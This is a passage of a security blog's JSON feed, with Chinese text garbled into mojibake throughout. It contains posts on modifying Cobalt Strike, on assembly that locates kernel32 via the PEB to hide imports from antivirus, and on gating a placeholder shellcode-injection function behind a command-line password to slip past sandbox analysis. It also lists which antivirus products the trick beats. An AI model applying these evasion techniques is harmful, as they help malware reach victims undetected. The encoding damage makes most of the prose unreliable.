é›†åˆå°è£…ä¸€ä¸‹åœ¨æ›¿æ¢å³å¯è§£å†³æŠ¥é”™ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯æ³›å‹è¦å¯¹é½ï¼Œå†æ¯”å¦‚ä¸‹å›¾ä¹Ÿæ˜¯è¿™æ ·ã€‚<br />\n<img data-src=\"https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hoar8n7oogj30m20553ze.jpg\" alt=\"\" /></p>\n<p>è¿˜æœ‰ä¸€ç§æŠ¥é”™å°±æ˜¯å±æ€§æŠ¥é”™ï¼Œè·Ÿè¿›é‚£ä¸ªç±»é‡Œçœ‹ä¸€ä¸‹æœ€æ¥è¿‘çš„å±æ€§æ˜¯ä»€ä¹ˆæ”¹æˆä»€ä¹ˆå°±è¡Œäº†ï¼Œè¿˜æœ‰åŒ…æ‹¬ä¸€äº›æ˜æ˜¾çš„é€»è¾‘ä¸Šçš„é”™è¯¯æ¯”å¦‚ä»å¤–é¢æ¥äº†å‚æ•°å´ä½¿ç”¨å¦ä¸€ä¸ªèµ‹å€¼ä¸ºç©ºçš„å‚æ•°å»æ¯”è¾ƒï¼š<br />\n<img data-src=\"https://dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hoarg84tvzj30xq09s3zo.jpg\" alt=\"\" /><br />\né”™è¯¯åŸå‹ä¸ºç¬¬äºŒè¡Œå¤šåŠ äº† <code>String text2 = &quot;&quot;</code> ï¼Œå¹¶åœ¨ <code>sum += text.charAt(x)</code>  è¿™æ®µä»£ç å˜æˆäº† <code>sum += text2.charAt(x)</code>  ä¿®æ­£è¿‡æ¥å³å¯ï¼Œåæ­£è¿™ç±»é€»è¾‘ä¸Šçš„ä»£ç é—®é¢˜è¿˜æ˜¯ç¨å¾®æ³¨æ„ä¸€ä¸‹å°±è¡Œã€‚</p>\n<p>è‡³æ­¤ç¯å¢ƒåŸºæœ¬æ­å»ºå®Œæˆï¼Œå¯ä»¥å¯åŠ¨ Agressor ç«¯è¿›è¡Œç›¸å…³ä¾‹å¦‚ UI çš„ä¿®æ”¹ä»¥åŠç›¸å…³åŠŸèƒ½çš„äºŒå¼€äº†</p>\n",
            "tags": [
                "å®‰å…¨å·¥å…·å¼€å‘",
                "å®‰å…¨å·¥å…·å¼€å‘"
            ]
        },
        {
            "id": "https://shut-td.github.io/%E8%87%AA%E6%88%91%E5%AE%9A%E4%BD%8D-%E6%9C%AA%E6%9D%A5%E5%B1%95%E6%9C%9B-To-Future/",
            "url": "https://shut-td.github.io/%E8%87%AA%E6%88%91%E5%AE%9A%E4%BD%8D-%E6%9C%AA%E6%9D%A5%E5%B1%95%E6%9C%9B-To-Future/",
            "title": "è‡ªæˆ‘å®šä½ & æœªæ¥å±•æœ› To Future~",
            "date_published": "2024-03-15T05:24:48.000Z",
            "content_html": "<h3 id=\"è‡ªæˆ‘å®šä½\"><a class=\"anchor\" href=\"#è‡ªæˆ‘å®šä½\">#</a> è‡ªæˆ‘å®šä½</h3>\n<p>ä¸å¤šè¯´ä¸Šå›¾<br />\n<img data-src=\"//dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hnrmbqbnrvj30q40q475r.jpg\" alt=\"\" /></p>\n<ul>\n<li>ç›®å‰ç®—æ˜¯å¤šæ–¹é¢å‘è‚²å§ï¼Œæ­£åœ¨å­¦ä¹ æœ‰å…³å†…æ ¸ã€é©±åŠ¨ã€é€†å‘ä»¥åŠä»£å®¡æœ‰å…³çš„çŸ¥è¯†ã€‚</li>\n<li>ç°åœ¨çš„æƒ³æ³•ä¸»è¦è¿˜æ˜¯æœç€ä»£ç å®¡è®¡å’Œå®‰å…¨å¼€å‘èµ°å§ï¼Œç›®æ ‡æš‚æ—¶å°±æ˜¯è¯•ç€äºŒå¼€æˆ–è€…ç›´æ¥è‡ªç ”ä¸€æ•´å¥— C2ï¼Œå®¡ä¸€å®¡æ¯”è¾ƒå¤§çš„å¼€æºæ¡†æ¶å§ã€‚</li>\n</ul>\n<h3 id=\"æœªæ¥å±•æœ›-to-future~\"><a class=\"anchor\" href=\"#æœªæ¥å±•æœ›-to-future~\">#</a> æœªæ¥å±•æœ› To Future~</h3>\n<p>å¯èƒ½æ›´æƒ³å»å®‰å…¨ç ”ç©¶ / å®éªŒå®¤ / æ”»é˜²çš„å²—ä½å§ğŸ™Œ</p>\n",
            "tags": []
        },
        {
            "id": "https://shut-td.github.io/%E6%84%8F%E5%A4%96%E7%9A%84Kernel32%E5%9F%BA%E5%9D%80%E5%AF%BB%E5%9D%80/",
            "url": "https://shut-td.github.io/%E6%84%8F%E5%A4%96%E7%9A%84Kernel32%E5%9F%BA%E5%9D%80%E5%AF%BB%E5%9D%80/",
            "title": "æ„å¤–çš„Kernel32åŸºå€å¯»å€",
            "date_published": "2024-03-15T03:03:18.000Z",
            "content_html": "<h3 id=\"å‰è¨€\"><a class=\"anchor\" href=\"#å‰è¨€\">#</a> å‰è¨€</h3>\n<pre><code>åœ¨PEæ–‡ä»¶ç»“æ„ä¸­æœ‰ä¸ªååˆ†é‡è¦çš„ä¸œè¥¿ï¼Œä¹Ÿæ˜¯æ€è½¯è¿›è¡Œé™æ€åˆ†ææ—¶å¸¸æ­»ç›¯ç€çš„ï¼Œé‚£å°±æ˜¯æˆ‘ä»¬çš„å¯¼å…¥è¡¨(Import Directory)ï¼Œå†…å«äº†è¯¥æ–‡ä»¶è¿è¡Œæ—¶è°ƒç”¨çš„DLLæ–‡ä»¶ä»¥åŠå¯¼å‡ºå‡½æ•°ã€‚\n</code></pre>\n<p><img data-src=\"//dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hnrid6mj92j31cx0tmgu8.jpg\" alt=\"\" /></p>\n<pre><code>å¦‚æœæˆ‘ä»¬ç¼–å†™è„šæœ¬æ—¶ä½¿ç”¨Windowsåº“å†…è‡ªå¸¦çš„APIï¼Œé‚£ä¹ˆè¿™äº›DLLæ–‡ä»¶ä»¥åŠåŒ…å«åœ¨å†…çš„å¯¼å‡ºå‡½æ•°ä¾¿ä¼šä¸€è§ˆæ— ä½™å¾—æš´éœ²å‡ºæ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†è¿™äº›éƒ½éšè—æ‰å®ç°å¯¼å…¥è¡¨éšè—ã€‚å¦‚ä½•å®ç°æœ€é‡è¦çš„ä¸€æ­¥å°±æ˜¯é€šè¿‡PEBæ‰¾åˆ°æˆ‘ä»¬çš„Kernel32åŸºå€ã€‚\n</code></pre>\n<h3 id=\"windbgè°ƒè¯•ä¸­é‡åˆ°çš„é—®é¢˜ä¸è§£å†³\"><a class=\"anchor\" href=\"#windbgè°ƒè¯•ä¸­é‡åˆ°çš„é—®é¢˜ä¸è§£å†³\">#</a> Windbg è°ƒè¯•ä¸­é‡åˆ°çš„é—®é¢˜ä¸è§£å†³</h3>\n<pre><code>Windbgçš„ä½¿ç”¨åŠå®‰è£…æ•™ç¨‹ç½‘ä¸Šèµ„æ–™å¾ˆå¤šå°±ä¸å¤šè¯´äº†ï¼Œä¸»è¦æä¸€ä¸‹åœ¨è°ƒè¯•æ—¶é‡åˆ°çš„å‡ ä¸ªé—®é¢˜ã€‚\n1ã€åœ¨é™„åŠ è¿›ç¨‹æ—¶å‡ºç°é”™è¯¯ï¼Œå…ˆå°è¯•ä»¥ç®¡ç†å‘˜æƒé™å¯åŠ¨Windbgå†é™„åŠ ï¼Œè‹¥ä»ç„¶æŠ¥é”™åˆ™ç›´æ¥File-&gt;Open Executable Fileç›´æ¥å¯åŠ¨ä»»æ„ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ä¹Ÿæ˜¯å¯ä»¥è¿›è¡Œè°ƒè¯•çš„ï¼Œå’Œé™„åŠ æ˜¯ä¸€æ ·çš„ã€‚\n2ã€è°ƒè¯•è¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯ Symbol _PEB ä¸å­˜åœ¨ç­‰ç­‰ä¹‹ç±»çš„ï¼Œåœ¨ç¬¦å·æœç´¢è·¯å¾„(Symbol File Path Search)ä¸­æ·»åŠ è·¯å¾„ï¼šSRV*c:\\mysymbol* http://msdl.microsoft.com/download/symbols å³å¯ã€‚\n3ã€æŸ¥è¯¢è‡³InloadOrderMudleListä¸­çš„Flinkï¼ŒBlinkåŒå‘é“¾è¡¨æ—¶å…¶åœ°å€ä¸º ??? ï¼Œè¿™æ˜¯æ“ä½œç³»ç»Ÿå¯¹å†…æ ¸æ•°æ®ç»“æ„çš„ä¿æŠ¤è¿›è¡Œçš„éšè—ï¼Œæˆ‘åˆ†åˆ«åœ¨Win10ï¼ŒWin10(è™šæ‹Ÿæœº)ï¼ŒWin11ä¸‰å°æœºå™¨ä¸Šæ“ä½œå‘ç°åªæœ‰Win10(è™šæ‹Ÿæœº)è¿›è¡Œäº†å­—æ®µéšè—ï¼Œåªæ˜¾ç¤º ???ï¼Œè¿™ä¸ªé—®é¢˜æˆ‘ä¹Ÿä¸çŸ¥é“æ€ä¹ˆè§£å†³ï¼Œçœ‹æƒ…å†µåº”è¯¥æ˜¯åªæœ‰è™šæ‹Ÿæœºä¼šå‡ºç°ï¼Œè¿˜æœ›æ‡‚çš„å¤§ä½¬èƒ½å¸®ä¸€æ‰‹ã€‚\n</code></pre>\n<p><img data-src=\"//dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hnriy3p62qj30pf0a4q3t.jpg\" alt=\"\" /></p>\n<p><img data-src=\"//dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hnrjm8yshdj30nq09y409.jpg\" alt=\"\" /></p>\n<h3 id=\"kernel32åŸºå€å¯»å€çš„ä¸¤æ¡è·¯çº¿\"><a class=\"anchor\" href=\"#kernel32åŸºå€å¯»å€çš„ä¸¤æ¡è·¯çº¿\">#</a> Kernel32 åŸºå€å¯»å€çš„ä¸¤æ¡è·¯çº¿</h3>\n<pre><code>å¦‚ä½•ä½¿ç”¨Windbgåœ¨PEBå¯»æ‰¾åˆ°kernel32åŸºå€è¿™é‡Œä¸å±•å¼€è¯´äº†æœ‰å¾ˆå¤šç›¸å…³çš„æ–‡ç« å¯ä»¥çœ‹ï¼Œè¿™é‡Œä¸»è¦çš„å†…å®¹æ˜¯æˆ‘åœ¨è°ƒè¯•å¯»å€è¿‡ç¨‹ä¸­å‘ç°çš„ä¸€äº›é—®é¢˜ã€‚\nç¬¬ä¸€æ¡è·¯çº¿ï¼šè¿™æ˜¯æœ€å¸¸è§çš„ä¸€æ¡å³é€šè¿‡InloadOrderMudleList:Flinkè¿™æ¡é“¾ä¸€ç›´å¾€ä¸‹è·Ÿå°±èƒ½æ‰¾åˆ°Kernel32çš„DllBaseï¼Œæ±‡ç¼–ä»£ç ï¼š\n</code></pre>\n<p><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">eax</span>, <span class=\"built_in\">fs</span>:[<span class=\"number\">0x30</span>]     //æ‰¾PEB</span><br><span class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">eax</span>, [<span class=\"built_in\">eax</span> + <span class=\"number\">0x0c</span>]  //è·å–Ldr</span><br><span class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">eax</span>, [<span class=\"built_in\">eax</span> + <span class=\"number\">0x0c</span>]  //è·å–InloadOrderMudleList:Flink</span><br><span class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">eax</span>, [<span class=\"built_in\">eax</span>]         //è·å–InloadOrderLinks:Flink =&gt; xxx<span class=\"number\">.</span>exe</span><br><span class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">eax</span>, [<span class=\"built_in\">eax</span>]         //è·å–InloadOrderLinks:Flink =&gt; ntdll<span class=\"number\">.</span>dll</span><br><span class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">eax</span>, [<span class=\"built_in\">eax</span> + <span class=\"number\">0x18</span>]  //è·å–kernel32 DLLBaseä¹Ÿå°±æ˜¯åŸºåœ°å€</span><br><span class=\"line\"><span class=\"keyword\">mov</span> dwKernel32Addr, <span class=\"built_in\">eax</span></span><br></pre></td></tr></table></figure><br />\n ç¬¬äºŒæ¡è·¯çº¿ï¼šåœ¨æœ€å…ˆå¼€å§‹ç ”ç©¶çš„æ—¶å€™æˆ‘ä»¥ä¸ºè¿™æ¡è·¯çº¿å°±æ˜¯ç¬¬ä¸€æ¡è·¯çº¿ï¼Œä½†éšç€è°ƒè¯•çš„è¿‡ç¨‹ä¸­å‘ç°è¿™åœ°å€ä¸å¯¹å•Šï¼æˆ‘è¿˜ä»¥ä¸ºæ˜¯æ“ä½œç³»ç»Ÿé€ æˆçš„åŒºåˆ«å¯¼è‡´åœ°å€ä¸ä¸€ï¼Œä½†æ˜¯æˆ‘è¿è¡Œäº†è¿™ä¸¤æ®µä»£ç éƒ½æˆåŠŸæŒ‡å‘åŒä¸€ä¸ªåœ°å€ä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„ Kernel32 çš„åŸºå€<br />\n <figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">eax</span>, <span class=\"built_in\">fs</span>: [<span class=\"number\">0x30</span>]      //æ‰¾åˆ°PEB</span><br><span class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">eax</span>, [<span class=\"built_in\">eax</span> + <span class=\"number\">0x0c</span>]    //æ‰¾LDR</span><br><span class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">eax</span>, [<span class=\"built_in\">eax</span> + <span class=\"number\">0x14</span>]    //InMemoryOrderModuleList:Flink</span><br><span class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">eax</span>, [<span class=\"built_in\">eax</span>]           //InLoadOrderLinks:<span class=\"string\">&quot;shellcode.exe&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">eax</span>, [<span class=\"built_in\">eax</span>]           //InLoadOrderLinks:<span class=\"string\">&quot;ntdll.dll&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">eax</span>, [<span class=\"built_in\">eax</span> + <span class=\"number\">0x10</span>]    //InInitializationOrderLinks:Flink =&gt; DllBase<span class=\"string\">&quot;kernel32.dll&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">mov</span> dwKernel32Addr, <span class=\"built_in\">eax</span></span><br></pre></td></tr></table></figure><br />\n ä»”ç»†è§‚å¯Ÿä¸Šè¿°ä¸¤æ®µå¯»å€æ±‡ç¼–ä¼šå‘ç°é™¤äº†è·å– Ldr å†…çš„ MudleList ä¸åŒå’Œæœ€åä¸åŒï¼Œå…¶ä»–æ‰¾çš„æ­¥éª¤éƒ½æ˜¯ä¸€æ ·ï¼Œé‚£æˆ‘ä»¬çœ‹çœ‹ä¸¤æ¡è·¯çº¿åœ¨ Windbg ä¸­æœ€ååˆ†åˆ«æ˜¯ä»€ä¹ˆ<br />\n<img data-src=\"//dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hnrkh9hfh8j30yy07twgy.jpg\" alt=\"\" /></p>\n<p><img data-src=\"//dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hnrkhb2uquj30wn07vdhu.jpg\" alt=\"\" /></p>\n<pre><code>å¯ä»¥å¾ˆæ˜æ˜¾çœ‹åˆ°è¿™ä¸¤ä¸ªå­—æ®µéƒ½æŒ‡å‘äº†0x76fd0000ï¼Œä½†æ˜¯åé¢ä¸ºä»€ä¹ˆInInitializationOrderLinks:Flinkçš„åœ°å€å°±æ˜¯Kernel32åŸºå€è€Œä¸æ˜¯DLLBaseå‘¢ï¼Ÿæ ¹æ®ç½‘ä¸Šä¼—å¤šèµ„æ–™æ”¶é›†æ¥çš„ä¿¡æ¯æ¥çœ‹å¯èƒ½æ˜¯å› ä¸ºç‰ˆæœ¬çš„åŸå› é€ æˆçš„ï¼Œå…¶çœŸæ­£çš„åŸºå€éœ€è¦åœ¨DllBaseçš„åœ°å€ä¸Šå›æ»š8ä¸ªå­—èŠ‚(ä¹Ÿå°±æ˜¯å›¾ä¸­ä» 0x18 ==&gt; 0x10)ï¼Œæ‰€ä»¥æ‰å˜æˆäº†Flinkçš„åœ°å€ã€‚å…¶ä¸­Ldrå†…ä¸‰ä¸ªæ¨¡å—éƒ½èƒ½æ‰¾åˆ°Kernel32åŸºå€(é™¤äº†ä¸Šè¿°ä¸¤æ¡è¿˜æœ‰InInitializationOrderModuleList)ï¼Œåªä¸è¿‡ç°åœ¨åªæœ‰ç¬¬ä¸€æ¡è·¯çº¿æ˜¯ä¸éœ€è¦å›æ»šå­—èŠ‚çš„ã€‚\n</code></pre>\n<p><img data-src=\"//dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hnrkqcctmbj30x30cftbx.jpg\" alt=\"\" /></p>\n<p><strong>è‡³äºè¦å›æ»šå­—èŠ‚çš„èƒŒåçš„åº•å±‚åŸå› æˆ‘ä¹Ÿä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œè¿˜è¯·çŸ¥é“çš„å¤§ä½¬æ•™æ•™ï½ï½</strong></p>\n",
            "tags": [
                "Pwn",
                "Pwn"
            ]
        },
        {
            "id": "https://shut-td.github.io/%E7%BB%99EXE%E4%B8%8A%E9%94%81/",
            "url": "https://shut-td.github.io/%E7%BB%99EXE%E4%B8%8A%E9%94%81/",
            "title": "ç»™EXEä¸Šé”",
            "date_published": "2024-03-14T10:15:25.000Z",
            "content_html": "<pre><code>åœ¨å…æ€ä¸­æˆ‘ä»¬å¸¸å¸¸ä¼šç”¨å„ç§åŠ å¯†æ‰‹æ®µå°†shellcodeè¿›è¡Œå˜å½¢ä»¥è¾¾åˆ°ç»•è¿‡æ€è½¯çš„é™æ€æ£€æµ‹åˆ†æï¼Œæ¯”å¦‚è¯´æœ€å¸¸è§çš„å¼‚æˆ–ï¼Œbase64ç¼–ç ï¼Œaesï¼Œrsaï¼Œeccç­‰ï¼Œå½“ç„¶é™æ€æŸ¥æ€å¹¶ä¸æ˜¯æˆ‘ä»¬ä¸»è¦è¦è§£å†³çš„ï¼Œå› ä¸ºé™æ€æŸ¥æ€æ˜¯æœ€å®¹æ˜“ç»•è¿‡çš„åŸºæœ¬ä¸Šç”¨å¼‚æˆ–å°±å¯ä»¥è§£å†³ï¼Œä»Šå¤©æˆ‘ä»¬çš„ä¸»é¢˜æ˜¯ç»•è¿‡æ€è½¯çš„åŠ¨æ€æŸ¥æ€ã€‚\nå…ˆè¯´è¯´æˆ‘è®¤ä¸ºçš„æ€è½¯æŸ¥æ€æ¶æ„æ–‡ä»¶çš„æ–¹æ³•å§ï¼Œç¬¬ä¸€ç§å°±æ˜¯é™æ€æŸ¥æ€ï¼Œåªé€šè¿‡æœç´¢å…¶æœ‰æ— æ¶æ„è½¯ä»¶çš„é™æ€ç‰¹å¾è¿›è¡ŒæŸ¥æ€ï¼Œè¿™ç§æ˜¯æœ€å®¹æ˜“ç»•è¿‡çš„åŸºæœ¬ä¸Šå¯¹æ¶æ„ä»£ç è¿›è¡Œç®€å•çš„å˜å½¢å°±å¯ä»¥ç»•è¿‡äº†ï¼›ç¬¬äºŒç§å°±æ˜¯åŠ¨æ€æŸ¥æ€ï¼Œå³ç”¨ä¸€ä¸ªæ²™ç®±å»æ¨¡æ‹Ÿæ‰§è¡Œä½ çš„æ–‡ä»¶çœ‹æ˜¯å¦ä¼šæ‰§è¡Œåˆ°æŸäº›æ•æ„Ÿæ“ä½œä¸Šå»ï¼›ç¬¬ä¸‰ç§æ˜¯å†…å­˜æŸ¥æ€å’Œè¡Œä¸ºç›‘æ§ï¼Œè¿™ä¹Ÿæ˜¯æœ€ä¸ºéš¾ç»•è¿‡çš„ï¼Œå› ä¸ºä¸ç®¡ä½ shellcodeåœ¨æ‰§è¡Œå‰æ˜¯ä»€ä¹ˆæ ·çš„åŠ è½½åˆ°å†…å­˜ä¸­å»å°±ä¼šç°å‡ºåŸå½¢ä»è€Œè¢«æ£€æŸ¥åˆ°ï¼Œè¿˜æœ‰åœ¨ä½ å»æ‰§è¡Œå‘½ä»¤æ—¶ä¸å¯é¿å…çš„ä¼šå‘å¤–è”åœ°å€å‘é€æ•°æ®ï¼Œè¿™å…¶ä¸­çš„æµé‡ç‰¹å¾ä¹Ÿæ˜¯éš¾ä»¥æ›´æ”¹çš„å› æ­¤å¾ˆå®¹æ˜“è¢«æ•æ‰åˆ°ï¼Œè¿™ä¹Ÿå°±æ˜¯æœ‰äº›æˆ‘ä»¬å¯ä»¥ä¸Šçº¿ä½†ä¸€æ‰§è¡Œå‘½ä»¤å°±å¯„äº†çš„åŸå› ã€‚\nå¥½ï¼Œç®€å•å™è¿°å®ŒæŸ¥æ€åŸå› ï¼Œæˆ‘ä»¬æ¥æ­¥å…¥ä»Šå¤©çš„ä¸»é¢˜ï¼Œå¦‚ä½•è½»æ¾ç»•è¿‡ç¬¬äºŒç§æŸ¥æ€ã€‚é¦–å…ˆä¹Ÿæ˜¯æœ€ä¸ºé‡è¦çš„ä¸€ç‚¹ï¼Œé‚£å°±æ˜¯æˆ‘ä»¬çš„exeæ–‡ä»¶åé¢æ˜¯å¯ä»¥è·Ÿå‚æ•°çš„ï¼Œä¸¾ä¸ªä¾‹å­ï¼š\n</code></pre>\n<p><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;å‚æ•°ä¸ªæ•°ï¼š%d&quot;</span>, argc);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;ç¬¬å‡ ä¸ªå‚æ•°ï¼š%s-%s&quot;</span>, argv[<span class=\"number\">0</span>], argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br />\n<img data-src=\"//dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hnqp2u9hz3j30vp0pjwfe.jpg\" alt=\"\" /></p>\n<p>å¯ä»¥çœ‹åˆ°è¾“å‡ºçš„å‚æ•°ï¼Œå…¶ä¸­ argc æ˜¯å‘½ä»¤è¡Œä¸­å‚æ•°ä¸ªæ•° (åŒ…æ‹¬äº†è¿™ä¸ªæ–‡ä»¶å)ï¼Œå…¶ä¸­ argv ä¸­å­˜å‚¨çš„æ˜¯å‘½ä»¤è¡Œä¸­æ‰€æœ‰çš„å‚æ•°ã€‚</p>\n<p><img data-src=\"//dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hnqp2wjah4j30vn0plq4a.jpg\" alt=\"\" /></p>\n<p>æ—¢ç„¶å¯ä»¥è·Ÿå‚æ•°å–å‚æ•°ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥åƒè®¾ç½®å¯†ç ä¸€æ ·æ§åˆ¶ç¨‹åºçš„æµç¨‹ï¼Œä»è€Œç»•è¿‡æŸäº›æ£€æµ‹æœºåˆ¶ã€‚</p>\n<p><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">Hello</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Hello World&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">InjectShellcode</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Inject shellcode!!!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (argc &gt;= <span class=\"number\">2</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((std::string)argv[<span class=\"number\">1</span>] == <span class=\"string\">&quot;123456&quot;</span>) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">InjectShellcode</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">Hello</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"//dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hnqp2zdzbnj31bz0plt9l.jpg\" alt=\"\" /></p>\n<p><img data-src=\"//dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hnqp315am2j30y60plmyf.jpg\" alt=\"\" /></p>\n<pre><code>æœ€ç»ˆæ•ˆæœå¦‚ä¸‹ï¼š\nç«ç»’ï¼šå¯æŒç»­ä¸Šçº¿ä¸ä¼šæ‰\n360ï¼šå¯æŒç»­ä¸Šçº¿ï¼Œå¯èƒ½é•¿æ—¶é—´ä¼šæ‰\nwindefï¼šå¯ä¸Šçº¿ä½†æ‰§è¡Œä¸äº†å‘½ä»¤(ç°åœ¨å·²ç»è¢«æ ‡è®°äº†ä¸Šä¸äº†çº¿)\nå¡å·´æ–¯åŸºï¼šå¯è¿‡é™æ€æ— æ³•ä¸Šçº¿\n</code></pre>\n<p><img data-src=\"//dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hnqp35147bj31mf0mcwml.jpg\" alt=\"\" /></p>\n<p><img data-src=\"//dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hnqp390367j31kp0koagt.jpg\" alt=\"\" /></p>\n<p><img data-src=\"//dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hnqp3avk4jj30sg0qmju1.jpg\" alt=\"\" /></p>\n<p><img data-src=\"//dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hnqp3dngo0j30s80lsacp.jpg\" alt=\"\" /></p>\n",
            "tags": [
                "å…æ€",
                "å…æ€"
            ]
        }
    ]
}